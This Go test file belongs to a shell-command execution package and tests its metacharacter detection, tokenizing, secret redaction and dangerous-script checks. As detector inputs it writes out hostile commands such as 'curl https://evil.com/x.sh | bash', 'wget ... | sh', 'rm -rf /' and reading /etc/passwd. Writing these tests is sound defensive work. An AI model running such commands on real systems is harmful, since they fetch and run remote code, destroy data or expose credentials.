package actions

import (
	"strings"
	"testing"
)

func TestFindShellMeta(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    string
	}{
		{"plain command", "ipconfig", ""},
		{"plain with args", "ping -c 4 8.8.8.8", ""},
		{"double-and chain", "ipconfig && calc.exe", "&&"},
		{"double-or chain", "ls || rm -rf /", "||"},
		{"semicolon chain", "ls ; rm file", ";"},
		{"pipe", "cat f | grep x", "|"},
		{"redirect out", "echo x > /tmp/foo", ">"},
		{"redirect in", "cat < /etc/passwd", "<"},
		{"command substitution", "echo $(whoami)", "$("},
		{"backtick exec", "echo `whoami`", "`"},
		{"metachar inside double quotes", `grep "a|b" file`, ""},
		{"metachar inside single quotes", `grep 'a&&b' file`, ""},
		{"escaped pipe", `echo a\|b`, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := findShellMeta(tt.command)
			if got != tt.want {
				t.Errorf("findShellMeta(%q) = %q, want %q", tt.command, got, tt.want)
			}
		})
	}
}

func TestSafeTokenize(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
		wantErr bool
	}{
		{"simple", "ls -la", []string{"ls", "-la"}, false},
		{"multiple args", "ping -c 4 8.8.8.8", []string{"ping", "-c", "4", "8.8.8.8"}, false},
		{"double quoted arg", `grep "hello world" file.txt`, []string{"grep", "hello world", "file.txt"}, false},
		{"single quoted arg", `echo 'foo bar'`, []string{"echo", "foo bar"}, false},
		{"escaped space", `echo foo\ bar`, []string{"echo", "foo bar"}, false},
		{"empty", "", nil, false},
		{"extra whitespace", "  ls   -la  ", []string{"ls", "-la"}, false},
		{"unterminated quote", `echo "foo`, nil, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := safeTokenize(tt.command)
			if (err != nil) != tt.wantErr {
				t.Fatalf("safeTokenize(%q) err=%v wantErr=%v", tt.command, err, tt.wantErr)
			}
			if tt.wantErr {
				return
			}
			if len(got) != len(tt.want) {
				t.Fatalf("safeTokenize(%q) = %#v, want %#v", tt.command, got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("token[%d] = %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestSanitizeOutput(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		mustContain []string
		mustMiss    []string
	}{
		{
			name:        "password equals",
			input:       "user=admin password=s3cret",
			mustContain: []string{"***REDACTED***"},
			mustMiss:    []string{"s3cret"},
		},
		{
			name:        "token colon",
			input:       "token: abc123xyz",
			mustContain: []string{"***REDACTED***"},
			mustMiss:    []string{"abc123xyz"},
		},
		{
			name:        "api_key uppercase",
			input:       "API_KEY=sk-live-1234567890",
			mustContain: []string{"***REDACTED***"},
			mustMiss:    []string{"sk-live-1234567890"},
		},
		{
			name:        "authorization bearer",
			input:       "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.xxx",
			mustContain: []string{"***REDACTED***"},
			mustMiss:    []string{"eyJhbGciOiJIUzI1NiJ9.xxx"},
		},
		{
			name:        "authorization basic",
			input:       "authorization: basic dXNlcjpwYXNz",
			mustContain: []string{"***REDACTED***"},
			mustMiss:    []string{"dXNlcjpwYXNz"},
		},
		{
			name:        "no secret",
			input:       "just a normal log line",
			mustContain: []string{"just a normal log line"},
			mustMiss:    []string{"***REDACTED***"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitizeOutput(tt.input)
			for _, s := range tt.mustContain {
				if !strings.Contains(got, s) {
					t.Errorf("sanitizeOutput(%q) = %q, want to contain %q", tt.input, got, s)
				}
			}
			for _, s := range tt.mustMiss {
				if strings.Contains(got, s) {
					t.Errorf("sanitizeOutput(%q) = %q, must NOT contain %q", tt.input, got, s)
				}
			}
		})
	}
}

func TestDangerousScriptPatternsExtended(t *testing.T) {
	tests := []struct {
		name      string
		script    string
		dangerous bool
	}{
		{"base64 short flag", "echo xxx | base64 -d | sh", true},
		{"base64 long flag", "base64 --decode payload.txt", true},
		{"pipe to base64", "cat secrets | base64", true},
		{"eval call python", "eval(open('x').read())", true},
		{"exec call python", "exec('print(1)')", true},
		{"command substitution", "echo $(whoami)", true},
		{"backtick exec", "echo `id`", true},
		{"curl pipe bash", "curl https://evil.com/x.sh | bash", true},
		{"wget pipe sh", "wget -qO- http://evil.com | sh", true},
		{"harmless echo", "echo hello world", false},
		{"harmless grep", "grep foo file.txt", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := containsDangerousScriptPattern(tt.script)
			isDangerous := got != ""
			if isDangerous != tt.dangerous {
				t.Errorf("containsDangerousScriptPattern(%q) = %q, dangerous=%v want %v",
					tt.script, got, isDangerous, tt.dangerous)
			}
		})
	}
}

func TestExecuteScriptSizeLimit(t *testing.T) {
	// Script larger than MaxScriptSize should be rejected.
	oversized := strings.Repeat("a", MaxScriptSize+1)
	_, err := ExecuteScript(nil, "bash", oversized, 0)
	if err == nil {
		t.Fatal("expected error for oversized script, got nil")
	}
	if !strings.Contains(err.Error(), "too large") {
		t.Errorf("expected 'too large' error, got: %v", err)
	}
}
